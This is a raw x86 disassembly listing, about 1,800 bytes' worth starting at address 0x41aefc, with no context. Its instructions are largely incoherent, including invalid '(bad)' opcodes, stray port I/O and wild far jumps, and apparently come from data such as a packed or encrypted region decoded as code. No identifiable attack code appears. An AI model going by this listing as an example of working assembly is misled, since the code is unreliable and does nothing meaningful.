  41aefc:	push   ebx
  41aefd:	psrlw  mm6,QWORD PTR [ecx+0x4a62e5f8]
  41af04:	sbb    esi,DWORD PTR [ebx]
  41af06:	loop   0x41af84
  41af08:	(bad)  
  41af0a:	lock js 0x41af76
  41af0d:	jo     0x41aef1
  41af0f:	imul   ecx,DWORD PTR [ebx],0x7882a241
  41af15:	mov    ebp,0x9bb867ca
  41af1a:	mov    DWORD PTR ds:0x8111176f,ebx
  41af20:	mov    ebx,0x7e276403
  41af25:	inc    ecx
  41af26:	sbb    bh,BYTE PTR [ecx-0x372876d7]
  41af2c:	dec    esp
  41af2d:	mov    eax,0x1a82400
  41af32:	inc    ecx
  41af33:	(bad)  
  41af34:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41af35:	jbe    0x41aedd
  41af37:	jno    0x41aefc
  41af39:	mov    edi,es
  41af3b:	pop    ds
  41af3c:	jecxz  0x41af1a
  41af3e:	and    dh,cl
  41af40:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41af41:	sbb    al,0x11
  41af43:	jnp    0x41aeeb
  41af45:	in     eax,dx
  41af46:	ja     0x41af90
  41af48:	or     DWORD PTR [esi+0x3bb34b3],esi
  41af4e:	popf   
  41af4f:	cmp    DWORD PTR [edi-0x55a3d65e],ecx
  41af55:	xchg   esi,eax
  41af56:	das    
  41af57:	test   al,0xab
  41af59:	sub    eax,0x97628851
  41af5e:	dec    eax
  41af5f:	sub    ecx,DWORD PTR [edi+ecx*1-0x46f3a05b]
  41af66:	mov    al,al
  41af68:	leave  
  41af69:	mov    cl,0xf
  41af6b:	xchg   esi,eax
  41af6c:	pop    es
  41af6d:	cmp    edx,0xf4885056
  41af73:	dec    esi
  41af74:	dec    esp
  41af75:	stc    
  41af76:	jns    0x41af9d
  41af78:	cwde   
  41af79:	(bad)  
  41af7a:	call   0x56282b2a
  41af7f:	sub    DWORD PTR [ebx-0x1],esi
  41af82:	scas   al,BYTE PTR es:[edi]
  41af83:	mov    bh,dh
  41af85:	retf   
  41af86:	call   0xcf32471c
  41af8b:	loop   0x41af5d
  41af8d:	cs or  ebp,ebx
  41af90:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41af91:	xchg   ebx,eax
  41af92:	and    DWORD PTR [esi],edi
  41af94:	or     al,0x5f
  41af96:	paddusb mm2,mm4
  41af99:	out    0x3e,al
  41af9b:	pop    ebx
  41af9c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41af9d:	lds    esp,FWORD PTR [esi+0x56]
  41afa0:	in     al,dx
  41afa1:	int    0x65
  41afa3:	pop    ebx
  41afa4:	sub    al,0x7a
  41afa6:	fldz   
  41afa8:	xchg   edx,eax
  41afa9:	cmp    al,0x67
  41afab:	shl    DWORD PTR [ebx],1
  41afad:	ins    DWORD PTR es:[edi],dx
  41afae:	mov    BYTE PTR [esi+0x38],dh
  41afb1:	push   ebp
  41afb2:	add    BYTE PTR [edx-0x6a662395],dh
  41afb8:	or     esi,DWORD PTR [edi-0x5f]
  41afbb:	shr    dh,cl
  41afbd:	mov    ebp,0xcd8f420d
  41afc2:	jno    0x41af8c
  41afc4:	sbb    al,0xf
  41afc6:	and    edi,DWORD PTR [edx+0x55]
  41afc9:	ins    DWORD PTR es:[edi],dx
  41afca:	jnp    0x41b01c
  41afcc:	sbb    BYTE PTR [esi-0x3a70bfc0],0x91
  41afd3:	jne    0x41b021
  41afd5:	loope  0x41af81
  41afd7:	repz xor dl,BYTE PTR [edi+0x5b]
  41afdb:	mov    al,0xe6
  41afdd:	pop    es
  41afde:	retf   
  41afdf:	push   ds
  41afe0:	jns    0x41afbb
  41afe2:	sbb    al,0xd0
  41afe4:	mov    ebx,DWORD PTR [ebp-0x7b]
  41afe7:	jmp    0xbd21b177
  41afec:	bound  esp,QWORD PTR [ebx+0x6052454f]
  41aff2:	cmp    al,0xb9
  41aff4:	fisttp QWORD PTR [edx+edi*8-0xe]
  41aff8:	retf   
  41aff9:	inc    esp
  41affa:	loop   0x41afa3
  41affc:	mov    al,0xd3
  41affe:	repnz in eax,0x46
  41b001:	(bad)  
  41b002:	fild   DWORD PTR [ecx-0x65db6f59]
  41b008:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41b009:	fmul   QWORD PTR [ebp+0x21]
  41b00c:	cmp    cl,ch
  41b00e:	jle    0x41b03b
  41b010:	test   BYTE PTR [edx+0xb],ah
  41b013:	push   edx
  41b014:	out    0xfd,al
  41b016:	jge    0x41b004
  41b018:	jle    0x41afe8
  41b01a:	cmp    cl,BYTE PTR [esi]
  41b01c:	push   ss
  41b01d:	pusha  
  41b01e:	push   esi
  41b01f:	scas   al,BYTE PTR es:[edi]
  41b020:	push   esi
  41b021:	xchg   ecx,eax
  41b022:	jge    0x41b09c
  41b024:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41b025:	jmp    0xfcaa90d8
  41b02a:	xor    ebp,DWORD PTR [edi-0xd2b94ef]
  41b030:	sbb    al,0x17
  41b032:	fstp   QWORD PTR [ebp-0x6b7092d0]
  41b038:	and    BYTE PTR [ebp+0x67],0xb8
  41b03c:	dec    esp
  41b03d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41b03e:	cmp    ah,BYTE PTR [edi+0x246bc5f2]
  41b044:	sar    DWORD PTR [esi+0x62],1
  41b047:	mov    edi,0x52863b63
  41b04c:	pop    es
  41b04d:	fwait
  41b04e:	(bad)  
  41b04f:	fidivr DWORD PTR [ecx-0x2abc26b]
  41b055:	retf   0xa121
  41b058:	pop    edi
  41b059:	sub    dh,bl
  41b05b:	int    0xaa
  41b05d:	dec    eax
  41b05e:	dec    ebx
  41b05f:	or     ebp,DWORD PTR [edx+edx*1]
  41b062:	mov    ds:0xbb12fb28,al
  41b067:	cmp    al,0xdf
  41b069:	mov    esi,ecx
  41b06b:	sti    
  41b06c:	aam    0x1b
  41b06e:	fs aas 
  41b070:	pop    ebp
  41b071:	xchg   DWORD PTR [eax+0x2ad8ecb3],ecx
  41b077:	iret   
  41b078:	xlat   BYTE PTR ds:[ebx]
  41b079:	sbb    eax,0xe49f81b1
  41b07e:	test   BYTE PTR [ebx-0x23],bl
  41b081:	(bad)  
  41b083:	sub    DWORD PTR [ebx],edi
  41b085:	rcl    BYTE PTR [ebx-0x35757c19],cl
  41b08b:	jns    0x41b03d
  41b08d:	loopne 0x41b019
  41b08f:	test   DWORD PTR [ebp+0x4bc72c8a],edx
  41b095:	enter  0x41dc,0x81
  41b099:	cmc    
  41b09a:	jbe    0x41b023
  41b09c:	add    BYTE PTR [edx-0x1d],dh
  41b09f:	loope  0x41b0fd
  41b0a1:	sub    eax,0x8af5d502
  41b0a6:	jns    0x41b0d3
  41b0a8:	mov    dl,0x57
  41b0aa:	jbe    0x41b03c
  41b0ac:	lods   eax,DWORD PTR ds:[esi]
  41b0ad:	xchg   esp,eax
  41b0ae:	adc    eax,DWORD PTR [ecx+0x7815cc49]
  41b0b4:	arpl   bx,cx
  41b0b6:	ret    0xa4d4
  41b0b9:	mov    esp,0xf628df23
  41b0be:	mov    esp,0xe4e24d40
  41b0c3:	sub    ch,BYTE PTR [edi-0x33]
  41b0c6:	inc    esi
  41b0c7:	lock (bad) 
  41b0c9:	adc    al,0xb4
  41b0cb:	ret    0xc7ec
  41b0ce:	jecxz  0x41b064
  41b0d0:	and    BYTE PTR [ebp+0x51117d7d],0x88
  41b0d7:	push   eax
  41b0d8:	ss xchg esi,eax
  41b0da:	mov    ds:0x2d505943,eax
  41b0df:	(bad)
  41b0e4:	dec    edi
  41b0e5:	leave  
  41b0e6:	fcom   DWORD PTR [eax-0x54]
  41b0e9:	pop    ecx
  41b0ea:	cmp    ah,ah
  41b0ec:	push   ebp
  41b0ed:	dec    edx
  41b0ee:	jl     0x41b10a
  41b0f0:	popf   
  41b0f1:	fild   DWORD PTR [esi+eiz*4+0x1239e0f4]
  41b0f8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41b0f9:	jae    0x41b16b
  41b0fb:	push   0x6bce57d
  41b100:	xchg   ecx,eax
  41b101:	and    BYTE PTR [edx-0x70685e23],cl
  41b107:	popa   
  41b108:	aad    0x59
  41b10a:	pop    ss
  41b10b:	fstp   QWORD PTR [ebp-0x3178333e]
  41b111:	iret   
  41b112:	add    dl,bl
  41b114:	popf   
  41b115:	inc    ebp
  41b116:	adc    BYTE PTR [eax-0x3a14bd96],0xcd
  41b11d:	ret    
  41b11e:	aaa    
  41b11f:	scas   eax,DWORD PTR es:[edi]
  41b120:	int    0x2
  41b122:	mov    dl,0xf0
  41b124:	xor    BYTE PTR [ebp+0x34],dh
  41b127:	mov    al,ds:0xf44c04a4
  41b12c:	push   esi
  41b12d:	in     eax,dx
  41b12e:	xchg   BYTE PTR [ebp+0x10],al
  41b131:	mov    esp,0xa675e983
  41b136:	(bad)  
  41b137:	push   eax
  41b138:	scas   al,BYTE PTR es:[edi]
  41b139:	cs stos BYTE PTR es:[edi],al
  41b13b:	sub    BYTE PTR [edx],ah
  41b13d:	or     DWORD PTR [edx+0x5d],edi
  41b140:	push   0xfcd38334
  41b145:	mov    dl,0x8d
  41b147:	dec    esp
  41b148:	call   0xa57c39a6
  41b14d:	add    BYTE PTR [eax],al
  41b14f:	add    BYTE PTR [eax],al
  41b151:	add    ah,bh
  41b153:	es out dx,eax
  41b155:	mov    eax,ds:0x7ffee9ff
  41b15a:	jmp    edx
  41b15c:	fdivp  st(6),st
  41b15e:	in     eax,dx
  41b15f:	mov    cl,0xf0
  41b161:	aas    
  41b162:	(bad)  
  41b163:	sub    eax,0x4f30001
  41b168:	add    BYTE PTR [eax],al
  41b16a:	lods   al,BYTE PTR ds:[esi]
  41b16b:	jbe    0x41b1ab
  41b16d:	cmp    ah,BYTE PTR [edx+0x490cd713]
  41b173:	xchg   esp,eax
  41b174:	fdiv   st,st(4)
  41b176:	sub    BYTE PTR [ecx+0x5d59a41e],bh
  41b17c:	and    cl,BYTE PTR [eax+0xd793585]
  41b182:	(bad)  
  41b183:	xchg   esp,eax
  41b184:	push   ss
  41b185:	inc    esp
  41b186:	fist   WORD PTR [ecx+0x526c9118]
  41b18c:	mov    cl,0x3a
  41b18e:	imul   BYTE PTR [eax]
  41b190:	out    dx,al
  41b191:	cmp    dh,BYTE PTR [ebx-0x3b]
  41b194:	add    dl,dh
  41b196:	sbb    ecx,DWORD PTR [eax-0x473c627]
  41b19c:	inc    esp
  41b19d:	into   
  41b19e:	inc    esp
  41b19f:	cdq    
  41b1a0:	sbb    al,0x79
  41b1a2:	jmp    0xa848451b
  41b1a7:	dec    eax
  41b1a8:	add    al,0x77
  41b1aa:	(bad)  
  41b1ab:	xlat   BYTE PTR ds:[ebx]
  41b1ac:	pop    ss
  41b1ad:	jl     0x41b226
  41b1af:	jnp    0x41b158
  41b1b1:	gs dec ebp
  41b1b3:	xchg   edi,eax
  41b1b4:	dec    edi
  41b1b6:	and    al,0x46
  41b1b8:	popf   
  41b1b9:	add    esp,ebp
  41b1bb:	and    BYTE PTR [edx-0xa21db6e],cl
  41b1c1:	arpl   WORD PTR [edi+0x76f51175],ax
  41b1c7:	jb     0x41b220
  41b1c9:	shl    ebx,1
  41b1cb:	pop    esi
  41b1cc:	aas    
  41b1cd:	fxtract 
  41b1cf:	das    
  41b1d0:	out    dx,eax
  41b1d1:	in     al,0x59
  41b1d3:	sbb    al,0xac
  41b1d5:	scas   eax,DWORD PTR es:[edi]
  41b1d6:	sub    eax,0x627669c6
  41b1db:	icebp  
  41b1dc:	mov    dl,0x55
  41b1de:	bound  ecx,QWORD PTR [edx-0x53]
  41b1e1:	sub    al,bl
  41b1e3:	mov    esi,0xc55ff7a7
  41b1e8:	in     eax,0xa3
  41b1ea:	cmp    edx,esp
  41b1ec:	inc    eax
  41b1ed:	imul   esi,DWORD PTR ds:0x7f49457e,0x33
  41b1f4:	outs   dx,BYTE PTR ds:[esi]
  41b1f5:	stos   DWORD PTR es:[edi],eax
  41b1f6:	outs   dx,BYTE PTR ds:[esi]
  41b1f7:	sub    ebp,esp
  41b1f9:	les    ecx,FWORD PTR [eax+0x2076483c]
  41b1ff:	test   al,0xe2
  41b201:	pop    ds
  41b202:	adc    bl,0x0
  41b205:	out    0x3b,eax
  41b207:	imul   ebx,esi,0xa140e9e0
  41b20d:	add    eax,ecx
  41b20f:	outs   dx,DWORD PTR ds:[esi]
  41b210:	or     ecx,DWORD PTR [ebx+0x571766bf]
  41b216:	add    BYTE PTR ss:[edi-0x20],dh
  41b21a:	arpl   WORD PTR [ecx+ebp*4+0x18635c09],cx
  41b221:	repz inc esi
  41b223:	and    eax,0x9cb1411
  41b228:	push   0x3528b903
  41b22d:	pusha  
  41b22e:	jle    0x41b1ce
  41b230:	mov    ah,0xe0
  41b232:	in     al,0x39
  41b234:	xchg   esp,eax
  41b235:	jg     0x41b220
  41b237:	ror    BYTE PTR [ebp+0x29],cl
  41b23a:	std    
  41b23b:	lods   eax,DWORD PTR ds:[esi]
  41b23c:	push   ebp
  41b23d:	and    BYTE PTR [edi],cl
  41b23f:	jb     0x41b2bb
  41b241:	lds    edi,FWORD PTR [ebp+edx*8-0x5970a9a3]
  41b248:	xor    eax,0xf65a14e9
  41b24d:	out    0x42,eax
  41b24f:	xchg   BYTE PTR [edx-0x4bd1c10e],dl
  41b255:	or     ecx,DWORD PTR [esi]
  41b257:	inc    ecx
  41b258:	mov    ch,0x4c
  41b25a:	inc    ebx
  41b25b:	cli    
  41b25c:	lea    ebx,ds:0x41a19eb0
  41b262:	aaa    
  41b263:	pop    ds
  41b264:	cmp    DWORD PTR [esi],ebp
  41b266:	and    BYTE PTR [ebp+0x70],bh
  41b269:	jmp    0x41b2a4
  41b26b:	pop    es
  41b26c:	dec    eax
  41b26d:	and    esp,DWORD PTR [ecx+0x7a87e103]
  41b273:	jbe    0x41b2f3
  41b275:	sub    dh,BYTE PTR [esi-0x60]
  41b278:	xor    bh,ch
  41b27a:	xor    ah,0x96
  41b27d:	cmp    ah,cl
  41b27f:	(bad)  
  41b280:	fs push ebp
  41b282:	inc    edx
  41b283:	lods   eax,DWORD PTR ds:[esi]
  41b284:	xchg   BYTE PTR [esi],ah
  41b286:	lea    edx,gs:[esi-0x2b]
  41b28a:	dec    esp
  41b28b:	in     al,dx
  41b28c:	xchg   edi,eax
  41b28d:	push   0x5c1bece2
  41b292:	popf   
  41b293:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41b294:	add    esp,DWORD PTR [ecx]
  41b296:	adc    BYTE PTR [esi+ebp*2],0xd5
  41b29a:	retf   
  41b29b:	mov    ch,0x53
  41b29d:	in     al,dx
  41b29e:	push   ebx
  41b29f:	mul    DWORD PTR [eax-0x71b36680]
  41b2a5:	or     DWORD PTR [ebx],ebx
  41b2a7:	rcl    DWORD PTR [ebp-0x10],1
  41b2aa:	scas   al,BYTE PTR es:[edi]
  41b2ab:	inc    esp
  41b2ac:	pop    edx
  41b2ad:	xlat   BYTE PTR ds:[ebx]
  41b2ae:	into   
  41b2af:	inc    esp
  41b2b0:	xor    BYTE PTR [edi],dl
  41b2b2:	sti    
  41b2b3:	sub    dl,bl
  41b2b5:	shl    al,cl
  41b2b7:	cmp    dh,ch
  41b2b9:	jo     0x41b28a
  41b2bb:	(bad)  
  41b2bc:	sbb    BYTE PTR [edi+ecx*1],bl
  41b2bf:	mov    al,ds:0x3173cd8e
  41b2c4:	xor    DWORD PTR [edi],esp
  41b2c6:	jmp    0x67599c5c
  41b2cb:	jae    0x41b2e0
  41b2cd:	ss pusha 
  41b2cf:	inc    edx
  41b2d0:	push   cs
  41b2d1:	int    0x79
  41b2d3:	jmp    0x9caef52e
  41b2d8:	cmp    eax,DWORD PTR [ebx-0x4b34ccb6]
  41b2de:	xchg   edi,eax
  41b2df:	inc    ecx
  41b2e0:	or     esp,DWORD PTR [esi-0x24]
  41b2e3:	mov    dh,0xd0
  41b2e5:	call   0x1a0f7012
  41b2ea:	out    0x5c,eax
  41b2ec:	add    cl,BYTE PTR [edx+0x16164870]
  41b2f2:	mov    dl,0x64
  41b2f5:	dec    esp
  41b2f6:	mov    ebp,0x7df4bce5
  41b2fb:	mov    ds,WORD PTR [ecx+ebx*2+0x1dff8e06]
  41b302:	sub    eax,0x87100e13
  41b307:	imul   eax,ebx,0xe2b8a0ea
  41b30d:	into   
  41b30e:	dec    ecx
  41b30f:	sbb    BYTE PTR [esi],dh
  41b311:	xor    BYTE PTR [esi],cl
  41b313:	in     al,dx
  41b314:	fstp   TBYTE PTR [edi-0x3106ec8]
  41b31a:	aas    
  41b31b:	lahf   
  41b31c:	cmp    al,ah
  41b31e:	and    DWORD PTR [ebp+0x27da0fb3],0xffffffb9
  41b325:	mov    esi,0x4224dc06
  41b32a:	nop
  41b32b:	cmc    
  41b32c:	mov    ds:0x5e4b6c3a,eax
  41b331:	lods   al,BYTE PTR ds:[esi]
  41b332:	test   DWORD PTR [edx+0x71],ebp
  41b335:	add    BYTE PTR [eax-0x3180a347],0x97
  41b33c:	dec    esi
  41b33d:	add    DWORD PTR [ebx],edx
  41b33f:	pushf  
  41b340:	adc    esi,DWORD PTR [ebx+0x5e089896]
  41b346:	jecxz  0x41b32a
  41b348:	lods   al,BYTE PTR ds:[esi]
  41b349:	xchg   BYTE PTR [esi-0x363780b2],bh
  41b34f:	scas   al,BYTE PTR es:[edi]
  41b350:	inc    eax
  41b351:	pop    eax
  41b352:	dec    edi
  41b353:	mov    ch,0xa0
  41b355:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41b356:	(bad)  
  41b357:	push   ecx
  41b358:	leave  
  41b359:	pop    es
  41b35a:	bound  esp,QWORD PTR [ecx]
  41b35c:	xor    esp,DWORD PTR [ecx]
  41b35e:	ja     0x41b365
  41b360:	cmp    BYTE PTR [ebx+0x489d1be],dl
  41b366:	adc    DWORD PTR [esi],eax
  41b368:	push   0x61
  41b36a:	jnp    0x41b3ae
  41b36c:	(bad)  
  41b36d:	adc    dh,BYTE PTR [edi-0x3f]
  41b370:	xor    DWORD PTR ds:0xdbbd997b,esi
  41b376:	inc    esi
  41b377:	loope  0x41b35e
  41b379:	or     al,0x32
  41b37b:	rcl    DWORD PTR [esi],cl
  41b37d:	adc    edx,esp
  41b37f:	rol    DWORD PTR [eax],0xb9
  41b382:	(bad)  
  41b383:	and    BYTE PTR [eax+0x1c],ah
  41b386:	fst    DWORD PTR [ebx-0x777d3773]
  41b38c:	sbb    edi,DWORD PTR [edx-0x78]
  41b38f:	sbb    eax,0x33f55b34
  41b394:	aam    0xcd
  41b396:	push   0xffffff9e
  41b398:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41b399:	xor    eax,0x9d8e48a3
  41b39e:	aam    0x39
  41b3a0:	cmc    
  41b3a1:	retf   0x85eb
  41b3a4:	jg     0x41b364
  41b3a6:	jecxz  0x41b375
  41b3a8:	rol    ebx,0x42
  41b3ab:	jle    0x41b40e
  41b3ad:	push   ecx
  41b3ae:	or     al,0x4a
  41b3b0:	jae    0x41b383
  41b3b2:	cs in  eax,0xcf
  41b3b5:	adc    BYTE PTR [ecx-0x5b],ah
  41b3b8:	push   ebp
  41b3b9:	in     eax,0x8c
  41b3bb:	idiv   BYTE PTR [edi]
  41b3bd:	lea    esi,[eax]
  41b3bf:	adc    DWORD PTR [edx+0x2e9c68f9],esp
  41b3c5:	dec    edx
  41b3c6:	push   eax
  41b3c7:	sub    dh,bh
  41b3c9:	into   
  41b3ca:	xlat   BYTE PTR ds:[ebx]
  41b3cb:	jecxz  0x41b406
  41b3cd:	es sub al,0x91
  41b3d0:	jns    0x41b417
  41b3d2:	dec    esp
  41b3d3:	adc    DWORD PTR [eax-0x67],0xc6e3706c
  41b3da:	pop    esi
  41b3db:	adc    DWORD PTR [edi],esi
  41b3dd:	xor    al,0x25
  41b3df:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41b3e0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41b3e1:	push   es
  41b3e2:	inc    edi
  41b3e3:	and    BYTE PTR [esi],ah
  41b3e5:	nop
  41b3e6:	fs push edi
  41b3e8:	push   es
  41b3e9:	push   edx
  41b3ea:	cli    
  41b3eb:	das    
  41b3ec:	jecxz  0x41b36e
  41b3ee:	sub    eax,0x3d93c824
  41b3f3:	mov    ebp,0xdb0da6a5
  41b3f8:	inc    ebx
  41b3f9:	jmp    0x14e39659
  41b3fe:	mov    edx,0xf348a4c8
  41b403:	outs   dx,DWORD PTR ds:[esi]
  41b404:	clc    
  41b405:	sub    al,0xf6
  41b408:	and    al,0x9b
  41b40a:	xchg   ebp,eax
  41b40b:	sub    eax,ebp
  41b40d:	stc    
  41b40e:	lock cmc 
  41b410:	(bad)  
  41b411:	dec    edi
  41b413:	inc    eax
  41b414:	int3   
  41b415:	in     eax,dx
  41b416:	ja     0x41b493
  41b418:	movs   DWORD PTR es:[edi],DWORD PTR ss:[esi]
  41b41a:	adc    edi,DWORD PTR [eax+0x4f]
  41b41d:	adc    eax,0x4931f98f
  41b422:	push   ebp
  41b423:	mov    ds:0x869da66,eax
  41b428:	pop    edi
  41b429:	xchg   esi,eax
  41b42a:	sar    BYTE PTR [ebx],cl
  41b42c:	sub    DWORD PTR [ecx+eax*4+0x77],edx
  41b430:	in     eax,0x5b
  41b432:	call   DWORD PTR [esi]
  41b434:	(bad)  [ecx]
  41b436:	nop
  41b437:	out    dx,eax
  41b438:	adc    bl,dh
  41b43a:	je     0x41b47a
  41b43c:	xor    eax,0x6cf69090
  41b441:	mov    ebx,0xafd61eba
  41b446:	scas   eax,DWORD PTR es:[edi]
  41b447:	call   0xc1a1:0x919fce98
  41b44e:	js     0x41b4a3
  41b450:	push   ebp
  41b451:	mov    ?,WORD PTR [esi-0x2a]
  41b454:	mov    BYTE PTR [eax-0x476c837e],dh
  41b45a:	push   cs
  41b45b:	dec    ebx
  41b45c:	cmp    BYTE PTR [ecx-0x6d],dh
  41b45f:	mov    ecx,0x75b218f4
  41b464:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41b465:	mov    edi,0x272d623e
  41b46a:	mov    eax,ds:0x7067bf59
  41b46f:	dec    edi
  41b470:	test   BYTE PTR [ebp-0x70b26433],0x41
  41b477:	or     esi,DWORD PTR [esi]
  41b479:	fs scas al,BYTE PTR es:[edi]
  41b47b:	push   edi
  41b47c:	loop   0x41b4fc
  41b47e:	mov    ds:0x3c163662,al
  41b483:	fcomp  DWORD PTR [edi-0x6d9fd4b1]
  41b489:	push   esp
  41b48a:	comiss xmm0,xmm5
  41b48d:	mov    eax,ds:0xd551c5d6
  41b492:	outs   dx,BYTE PTR ds:[esi]
  41b493:	push   edi
  41b494:	mov    dh,BYTE PTR [eax+0x61]
  41b497:	push   eax
  41b498:	call   0x2dcf6dae
  41b49d:	mov    eax,0xffcbaa6c
  41b4a2:	sbb    BYTE PTR [esi-0x5d112522],bl
  41b4a8:	sub    dl,ch
  41b4aa:	aad    0xa8
  41b4ac:	or     esp,DWORD PTR [edi]
  41b4ae:	fsubr  QWORD PTR [eax-0x67]
  41b4b1:	mov    eax,ds:0xd9a4c777
  41b4b6:	jmp    0xb44029ad
  41b4bb:	test   BYTE PTR [eax-0x1bc70dd6],ah
  41b4c1:	xlat   BYTE PTR ds:[ebx]
  41b4c2:	out    dx,al
  41b4c3:	jnp    0x41b4a0
  41b4c5:	xor    eax,0x63b2e94a
  41b4ca:	push   ss
  41b4cb:	test   DWORD PTR [esi+0x5],0xcfc7304f
  41b4d2:	stos   DWORD PTR es:[edi],eax
  41b4d3:	cmc    
  41b4d4:	pop    esi
  41b4d5:	loope  0x41b4de
  41b4d7:	lods   al,BYTE PTR ds:[esi]
  41b4d8:	jl     0x41b4ab
  41b4da:	or     BYTE PTR [ebx],al
  41b4dc:	out    0x7,eax
  41b4de:	xchg   esi,eax
  41b4df:	inc    esp
  41b4e0:	sahf   
  41b4e1:	push   ebp
  41b4e2:	dec    edx
  41b4e3:	fwait
  41b4e4:	push   esi
  41b4e5:	mov    cl,0x28
  41b4e7:	inc    eax
  41b4e8:	fadd   DWORD PTR [edx-0x454d741c]
  41b4ee:	mov    ds:0xf11278ec,eax
  41b4f3:	ret    
  41b4f4:	loope  0x41b4dd
  41b4f6:	cdq    
  41b4f7:	adc    esp,esi
  41b4f9:	xchg   esi,eax
  41b4fa:	push   0x57
  41b4fc:	mov    BYTE PTR [edi+0x1ec76bc8],cl
  41b502:	pop    eax
  41b503:	sti    
  41b504:	mov    WORD PTR [edi+0x28],ds
  41b507:	pop    eax
  41b508:	mov    dl,0x17
  41b50a:	push   edx
  41b50b:	push   0xffffffc9
  41b50d:	push   es
  41b50e:	mov    dh,0xbf
  41b510:	push   esi
  41b511:	pop    edi
  41b512:	cli    
  41b513:	cmp    ebp,ecx
  41b515:	dec    edx
  41b516:	fisubr WORD PTR [ecx]
  41b518:	imul   BYTE PTR [edx+0x5b]
  41b51b:	cmp    BYTE PTR ss:[ecx],0xd1
  41b51f:	jbe    0x41b593
  41b521:	sbb    al,0xc0
  41b523:	pop    ebp
  41b524:	in     eax,dx
  41b525:	mov    BYTE PTR [esi],ah
  41b527:	inc    edi
  41b528:	xchg   ebp,eax
  41b529:	inc    bh
  41b52b:	pop    esi
  41b52c:	das    
  41b52d:	or     bl,BYTE PTR [ecx+0x5b2d3557]
  41b533:	jae    0x41b520
  41b535:	add    al,0x19
  41b537:	stos   DWORD PTR es:[edi],eax
  41b538:	inc    ebx
  41b539:	or     edi,0xffa9d1eb
  41b53f:	mov    cl,0xb0
  41b541:	push   0xffffff8e
  41b543:	add    BYTE PTR [ebx-0x2],bh
  41b546:	retf   
  41b547:	xchg   esp,eax
  41b548:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41b549:	ja     0x41b533
  41b54b:	xchg   ebp,eax
  41b54c:	test   ah,bl
  41b54e:	aam    0xb7
  41b550:	jmp    0x41b572
  41b552:	mov    cl,0x3b
  41b554:	push   ebp
  41b555:	aad    0x51
  41b557:	jp     0x41b529
  41b559:	cmc    
  41b55a:	cmp    al,0x95
  41b55c:	xchg   edi,eax
  41b55d:	gs ss pop ss
  41b560:	lods   eax,DWORD PTR ds:[esi]
  41b561:	les    eax,FWORD PTR [esi]
  41b563:	gs jle 0x41b5b3
  41b566:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41b567:	out    0x96,eax
  41b569:	fcmove st,st(1)
  41b56b:	xchg   esi,eax
  41b56c:	ins    BYTE PTR es:[edi],dx
  41b56d:	dec    esp
  41b56e:	fwait
  41b56f:	js     0x41b520
  41b571:	inc    esp
  41b572:	lods   al,BYTE PTR cs:[esi]
  41b574:	aad    0xec
  41b576:	cwde   
  41b577:	pushf  
  41b578:	add    al,0xfd
  41b57a:	lods   al,BYTE PTR ds:[esi]
  41b57b:	imul   edi,edi,0x796cf66d
  41b581:	sbb    BYTE PTR [eax+0x7f83c10f],ch
  41b587:	mov    bh,0x18
  41b589:	mov    ebx,0x36a884ee
  41b58e:	mov    BYTE PTR [esi],dh
  41b590:	xor    ebx,edi
  41b592:	stc    
  41b593:	(bad)  
  41b594:	bound  ebp,QWORD PTR [esi+0x78e6408]
  41b59a:	mov    bl,0x91
  41b59c:	int3   
  41b59d:	repz dec esi
  41b59f:	(bad)  
  41b5a0:	in     eax,dx
  41b5a1:	popf   
  41b5a2:	loopne 0x41b59c
  41b5a4:	and    eax,0x6a342204
  41b5a9:	sbb    BYTE PTR [esi+ebp*8-0x13],ch
  41b5ad:	repnz popa 
  41b5af:	or     al,0x92
  41b5b1:	std    
  41b5b2:	inc    edx
  41b5b3:	popf   
  41b5b4:	push   eax
  41b5b5:	inc    ecx
  41b5b6:	xchg   BYTE PTR [ecx-0x31],dh
  41b5b9:	pop    edi
  41b5ba:	mov    al,0x3
  41b5bc:	stos   BYTE PTR es:[edi],al
  41b5bd:	or     ebp,DWORD PTR [ecx-0x9]
  41b5c0:	outs   dx,DWORD PTR ds:[esi]
  41b5c1:	pop    edi
  41b5c2:	inc    edx
  41b5c3:	loope  0x41b5ca
  41b5c5:	inc    ecx
  41b5c6:	retf   0x8a0b
  41b5c9:	pop    edx
  41b5ca:	jne    0x41b634
  41b5cc:	cmc    
  41b5cd:	imul   ebx,DWORD PTR [ecx+0x5056d221],0xffffffe1
  41b5d4:	pop    eax
  41b5d5:	loop   0x41b5b7
  41b5d7:	jecxz  0x41b624
  41b5d9:	push   ss
  41b5da:	xor    DWORD PTR [edx+0x68],edi
  41b5dd:	sbb    eax,0xbeda388f
  41b5e2:	sbb    BYTE PTR [ebx-0x34],dh
  41b5e5:	mov    ebx,0x6a83e94c
  41b5ea:	adc    DWORD PTR [ebx],0x5
  41b5ed:	jge    0x41b5cb
  41b5ef:	jl     0x41b5f3
  41b5f1:	aaa    
  41b5f2:	fdiv   DWORD PTR ds:0xf0579257
  41b5f8:	sbb    BYTE PTR [edx-0x2f8487d6],bl
  41b5fe:	or     al,0x8a
  41b600:	fs and bl,ch
  41b603:	xlat   BYTE PTR ds:[ebx]
  41b604:	daa    
  41b605:	push   ebp
  41b606:	and    eax,0xdd640145
  41b60b:	aaa    
  41b60c:	les    edx,FWORD PTR [eax+edi*2+0x6dc7f1aa]
  41b613:	sbb    BYTE PTR [ecx+0x65],ch
  41b616:	push   0x32
  41b618:	pop    ds
  41b619:	add    BYTE PTR [edi],dl
  41b61b:	push   ss
  41b61c:	fs out dx,al
  41b61e:	push   cs
  41b61f:	push   0xffffffc7
  41b621:	ja     0x41b5e1
  41b623:	pusha  
  41b624:	out    0xbd,eax
  41b626:	lods   eax,DWORD PTR ds:[esi]
